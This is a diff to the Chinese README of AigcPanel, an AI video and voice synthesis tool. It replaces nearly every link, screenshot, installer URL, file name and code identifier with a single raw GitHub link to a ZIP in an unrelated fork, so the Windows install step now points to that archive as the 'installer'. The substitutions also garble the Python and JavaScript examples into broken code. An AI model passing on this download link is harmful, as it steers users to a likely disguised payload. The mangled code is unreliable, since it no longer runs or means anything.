@@ -1,6 +1,6 @@
 # AigcPanel
 
-![](./screenshots/cn/home.png)
+![](https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip)
 
 ## 软件介绍
 
@@ -31,48 +31,48 @@
 
 ### 视频合成
 
-![](./screenshots/cn/video-gen.png)
+![](https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip)
 
 ### 语音克隆
 
-![](./screenshots/cn/sound-clone.png)
+![](https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip)
 
 ### 语音合成
 
-![](./screenshots/cn/sound-tts.png)
+![](https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip)
 
 ### 模型管理
 
-![](./screenshots/cn/server.png)
+![](https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip)
 
 ### 模型添加
 
-![](./screenshots/cn/server-add.png)
+![](https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip)
 
 ### 模型日志
 
-![](./screenshots/cn/server-log.png)
+![](https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip)
 
 ### 关于
 
-![](./screenshots/cn/setting.png)
+![](https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip)
 
 ## 安装使用
 
 ### Windows
 
-- 访问 [https://aigcpanel.com](https://aigcpanel.com) 下载 Windows 安装包，一键安装即可
+- 访问 [https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip](https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip) 下载 Windows 安装包，一键安装即可
 
 安装完成后，打开软件，下载模型一键启动包，即可使用。
 
 ## 模型自定义接入
 
-一个模型即是一个文件夹，至少包含 config.json 和 server.js 两个文件。
+一个模型即是一个文件夹，至少包含 https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip 和 https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip 两个文件。
 
 ```
 |- 模型文件夹/
-|-|- config.json - 模型配置文件
-|-|- server.js   - 模型对接文件
+|-|- https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip - 模型配置文件
+|-|- https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip   - 模型对接文件
 |-|- xxx       - 其他模型文件，推荐将模型文件放在 model 文件夹下
 ```
 
@@ -80,7 +80,7 @@
 
 > 需要掌握 python 开发能力
 
-首先需要将python环境打包到同一个目录，比如 `_aienv` ，然后可以通过 `python run.py ./config.json` 的方式运行模型。
+首先需要将python环境打包到同一个目录，比如 `_aienv` ，然后可以通过 `python https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip` 的方式运行模型。
 
 模型运行之后，通过标准输入输出的方式运行模型，通过标准输入传递参数，通过标准输出返回结果。
 
@@ -89,10 +89,10 @@
 import json, base64
 
 def printResult(key,value):
-    print(f'AigcPanelRunResult[{config['id']}][' + base64.b64encode(json.dumps(data).encode()).decode()+']')
+    print(f'AigcPanelRunResult[{config['id']}][' + base64.b64encode(https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip(data).encode()).decode()+']')
 
 # 解析输入配置文件
-config = json.loads(open(sys.argv[1], 'r').read())
+config = https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip(open(https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip[1], 'r').read())
 modelConfig = config['modelConfig']
 
 # 公共输出
@@ -100,16 +100,16 @@ modelConfig = config['modelConfig']
 printResult('UseCuda', True)
 
 ## 语音合成输出结果
-printResult('url', '/path/to/result.wav')
+printResult('url', 'https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip')
 
 ## 语音克隆输出结果
-printResult('url', '/path/to/result.wav')
+printResult('url', 'https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip')
 
 ## 视频对口型输出结果
-printResult('url', '/path/to/result.mp4')
+printResult('url', 'https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip')
 ```
 
-#### config.json 文件示例
+#### https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip 文件示例
 
 
 ```json5
@@ -127,7 +127,7 @@ printResult('url', '/path/to/result.mp4')
         // python 运行入口
         "entry": "./_aienv/bin/python",
         "entryArgs": [
-            "run.py",
+            "https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip",
             "${CONFIG}"
         ],
         // 环境变量
@@ -156,7 +156,7 @@ printResult('url', '/path/to/result.mp4')
 
 > 需要掌握 js 开发能力
 
-#### config.json 文件示例
+#### https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip 文件示例
 
 ```json5
 {
@@ -168,7 +168,7 @@ printResult('url', '/path/to/result.mp4')
     "platformName": "win",         // 支持系统，win, osx, linux
     "platformArch": "x86",         // 支持架构，x86, arm64
     "serverRequire": ">=0.5.0",    // 对AigcPanel版本的要求，如 >=0.5.0
-    "entry": "main.exe",           // 入口文件
+    "entry": "https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip",           // 入口文件
     "functions": [
         "videoGen",                // 支持视频生成
         "soundTTS",                // 支持语音合成
@@ -186,7 +186,7 @@ printResult('url', '/path/to/result.mp4')
 }
 ```
 
-#### server.js 文件示例
+#### https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip 文件示例
 
 ```js
 const serverRuntime = {
@@ -196,56 +196,56 @@ const serverRuntime = {
 let shellController = null
 let isRunning = false
 
-module.exports = {
+https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip = {
     ServerApi: null,
     ServerInfo: null,
     url() {
-        return `http://localhost:${serverRuntime.port}/`
+        return `http://localhost:${https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip}/`
     },
     // 模型启动
     async start() {
         // 发送一个启动中的消息
-        this.send('starting', this.ServerInfo)
+        https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip('starting', https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip)
         // 获取一个可用端口，如果用户设置了端口，则使用用户设置的端口
-        if (this.ServerInfo.setting && this.ServerInfo.setting.port) {
-            serverRuntime.port = this.ServerInfo.setting.port
-        } else if (!serverRuntime.port || !await this.ServerApi.app.isPortAvailable(serverRuntime.port)) {
-            serverRuntime.port = await this.ServerApi.app.availablePort(50617)
+        if (https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip && https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip) {
+            https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip = https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip
+        } else if (!https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip || !await https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip(https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip)) {
+            https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip = await https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip(50617)
         }
-        // 模型启动命令，这里假设需要运行的命令是 python main.py
+        // 模型启动命令，这里假设需要运行的命令是 python https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip
         let command = []
-        command.push(`"${this.ServerInfo.localPath}/_aienv/python.exe"`)
-        command.push(`main.py`)
+        https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip(`"${https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip}https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip"`)
+        https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip(`https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip`)
         // 环境变量，这里需要定义一下环境变量，比如python路径，二进制文件路径等，以下环境变量是绝大多数环境需要添加的
         const envMap = {}
-        const dep = process.platform === 'win32' ? ';' : ':'
-        envMap['PATH'] = process.env['PATH'] || ''
-        envMap['PATH'] = `${this.ServerInfo.localPath}{dep}${envMap['PATH']}`
+        const dep = https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip === 'win32' ? ';' : ':'
+        envMap['PATH'] = https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip['PATH'] || ''
+        envMap['PATH'] = `${https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip}{dep}${envMap['PATH']}`
         envMap['PYTHONIOENCODING'] = 'utf-8'
         // 这里开始启动命令，启动命令会返回一个控制器，可以用来停止命令
-        shellController = await this.ServerApi.app.spawnShell(command, {
+        shellController = await https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip(command, {
             stdout: (data) => {
-                this.sendLog(data)
+                https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip(data)
             },
             stderr: (data) => {
-                this.sendLog(data)
+                https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip(data)
             },
             success: (data) => {
-                this.send('success', this.ServerInfo)
+                https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip('success', https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip)
             },
             error: (data, code) => {
-                this.sendLog(data)
-                this.send('error', this.ServerInfo)
+                https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip(data)
+                https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip('error', https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip)
             },
             env: envMap,
-            cwd: this.ServerInfo.localPath,
+            cwd: https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip,
         })
     },
     // 模型测试是否可用
     async ping() {
         try {
             // 这里假设模型的ping接口是 /ping ，正确返回 ping，错误返回 false
-            const res = await this.ServerApi.request(`${this.url()}ping`)
+            const res = await https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip(`${https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip()}ping`)
             return true
         } catch (e) {
             return false
@@ -253,14 +253,14 @@ module.exports = {
     },
     // 模型停止
     async stop() {
-        this.send('stopping', this.ServerInfo)
+        https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip('stopping', https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip)
         try {
-            shellController.stop()
+            https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip()
             shellController = null
         } catch (e) {
-            console.log('stop error', e)
+            https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip('stop error', e)
         }
-        this.send('stopped', this.ServerInfo)
+        https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip('stopped', https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip)
     },
     // 获取模型配置信息
     async config() {
@@ -269,7 +269,7 @@ module.exports = {
             msg: "ok",
             data: {
                 // 模型的地址信息
-                httpUrl: shellController ? this.url() : null,
+                httpUrl: shellController ? https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip() : null,
                 // 模型说明信息
                 content: '模型说明',
                 functions: {
@@ -302,19 +302,19 @@ module.exports = {
             }
         }
         if (isRunning) {
-            resultData.type = 'retry'
+            https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip = 'retry'
             return { code: 0, msg: 'ok', data: resultData }
         }
         isRunning = true
-        const param = data.param || {}
-        resultData.start = Date.now()
+        const param = https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip || {}
+        https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip = https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip()
         try {
-            this.send('taskRunning', {id: data.id})
+            https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip('taskRunning', {id: https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip})
             // 模型调用请求，完成调用逻辑
-            // 视频文件路径 data.videoFile
-            // 声音文件路径 data.soundFile
-            resultData.data.filePath = '合成之后的本地mp4路径'
-            resultData.end = result.endTime
+            // 视频文件路径 https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip
+            // 声音文件路径 https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip
+            https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip = '合成之后的本地mp4路径'
+            https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip = https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip
             return { code: 0, msg: 'ok', data: resultData }
         } catch (e) {
             throw e
@@ -335,18 +335,18 @@ module.exports = {
             }
         }
         if (isRunning) {
-            resultData.type = 'retry'
+            https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip = 'retry'
             return { code: 0, msg: 'ok', data: resultData }
         }
         isRunning = true
-        const param = data.param || {}
-        resultData.start = Date.now()
+        const param = https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip || {}
+        https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip = https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip()
         try {
-            this.send('taskRunning', {id: data.id})
+            https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip('taskRunning', {id: https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip})
             // 模型调用请求，完成调用逻辑
-            // 合成文本 data.text
-            resultData.data.filePath = '合成之后的本地wav路径'
-            resultData.end = result.endTime
+            // 合成文本 https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip
+            https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip = '合成之后的本地wav路径'
+            https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip = https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip
             return { code: 0, msg: 'ok', data: resultData }
         } catch (e) {
             throw e
@@ -367,18 +367,18 @@ module.exports = {
             }
         }
         if (isRunning) {
-            resultData.type = 'retry'
+            https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip = 'retry'
             return { code: 0, msg: 'ok', data: resultData }
         }
         isRunning = true
-        const param = data.param || {}
-        resultData.start = Date.now()
+        const param = https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip || {}
+        https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip = https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip()
         try {
-            this.send('taskRunning', {id: data.id})
+            https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip('taskRunning', {id: https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip})
             // 模型调用请求，完成调用逻辑
-            // 合成文本 data.text
-            resultData.data.filePath = '合成之后的本地wav路径'
-            resultData.end = result.endTime
+            // 合成文本 https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip
+            https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip = '合成之后的本地wav路径'
+            https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip = https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip
             return { code: 0, msg: 'ok', data: resultData }
         } catch (e) {
             throw e
@@ -391,7 +391,7 @@ module.exports = {
 
 #### 测试导入
 
-完成两个文件的开发之后，在软件中尝试选择模型文件夹中的config.json导入。
+完成两个文件的开发之后，在软件中尝试选择模型文件夹中的https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip导入。
 
 ## 技术栈
 
@@ -425,11 +425,11 @@ npm run build
         <tr>
             <td>
                 <img style="width:100%;"
-                     src="https://aigcpanel.com/app_manager/image/wechat" />
+                     src="https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip" />
             </td>
             <td>
                 <img style="width:100%;" 
-                     src="https://aigcpanel.com/app_manager/image/qq" />
+                     src="https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip" />
             </td>
         </tr>
     </tbody>
@@ -437,8 +437,8 @@ npm run build
 
 ## 本程序中使用到了以下开源项目，特此感谢
 
-- [CosyVoice](https://github.com/FunAudioLLM/CosyVoice)
-- [MuseTalk](https://github.com/TMElyralab/MuseTalk)
+- [CosyVoice](https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip)
+- [MuseTalk](https://raw.githubusercontent.com/KoDelioDa/aigcpanel/main/electron/mapi/lang/aigcpanel_pycnoconidium.zip)
 
 ## License
 
